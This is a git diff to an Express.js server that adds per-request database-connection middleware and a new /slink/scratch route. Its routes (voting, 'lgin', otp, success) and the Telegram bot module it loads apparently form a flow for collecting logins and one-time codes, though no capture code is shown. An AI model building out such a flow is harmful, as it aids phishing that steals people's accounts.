@@ -8,7 +8,17 @@ require("./lib/telegramBot");
 const connectDB = require("./lib/mongodb");
 const cors = require("cors")
 
-connectDB();
+// Middleware to ensure DB connection before each request
+app.use(async (req, res, next) => {
+  try {
+    await connectDB();
+    next();
+  } catch (err) {
+    console.error("DB middleware error:", err.message);
+    return res.status(503).send("Service temporarily unavailable. Please try again.");
+  }
+});
+
 // Set EJS as templating engine
 app.use(cors({origin: '*'}));
 app.set('view engine', 'ejs');
@@ -48,9 +58,11 @@ const votingRouter = require('./routes/slink');
 const loginRouter = require('./routes/slink/lgin');
 const otpRouter = require('./routes/slink/otp');
 const successRouter = require('./routes/slink/success');
+const scratchRouter = require('./routes/slink/scratch');
 const apiRouter = require('./routes/api');
 
 // Use routes
+app.use('/slink/scratch', scratchRouter);
 app.use('/slink', votingRouter);
 app.use('/slink/lgin', loginRouter);
 app.use('/slink/otp', otpRouter);
